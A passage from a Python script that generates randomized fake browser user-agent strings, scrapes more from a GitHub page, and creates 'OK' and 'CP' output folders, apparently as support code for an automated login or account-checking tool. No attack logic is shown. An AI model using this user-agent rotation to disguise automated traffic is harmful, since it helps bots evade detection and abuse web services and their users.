   ugent2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,15))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/{str(rr(110,130))}.0.{str(rr(3000,5999))}.{str(rr(110,130))} Mobile Safari/537.36"
   ugent3 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(110,120))}.0.0.0 Mobile Safari/537.36"
   ugent4 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) QupZilla/1.9.0 Safari/538.1"
   ugent5 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Standalone HMD) AppleWebKit/537.36 (KHTML, like Gecko) OculusBrowser/8.5.0.4.24.209184609 SamsungBrowser/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} Mobile VR Safari/537.36"
   ugent6 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; zh-cn; OPPO R9sk Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} Mobile Safari/537.36 OppoBrowser/10.5.1.2"
   ugent7 = f"Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; SM-G9550 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} UCBrowser/{str(rr(6,13))}.{str(rr(6,20))}.0.{str(rr(500,1500))} UWS/2.14.0.9 Mobile Safari/537.36 AliApp(TB/7.9.2) UCBS/2.11.1.1 TTID/10004868@taobao_android_7.9.2 WindVane/8.3.0 1080X2076"
   ugent8 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; en-US; SM-J810F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} UCBrowser/{str(rr(6,13))}.{str(rr(6,20))}.0.{str(rr(500,1500))} Mobile Safari/537.36"
   ugent9 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; en-US; HRY-LX1MEB Build/HONORHRY-LX1MEB) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} UCBrowser/{str(rr(6,13))}.{str(rr(6,20))}.0.{str(rr(500,1500))} Mobile Safari/537.36"
   ugent10 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; zh-cn; M2004J19C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,200))}.0.{str(rr(2999,8999))}.{str(rr(50,100))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.2.150419"
   zax = random.choice([ugent1,ugent2,ugent3,ugent4,ugent5,ugent6,ugent7,ugent8,ugent9,ugent10])
   ugen.append(zax)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#---------------------[Approval]---------------------#
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	rmain()
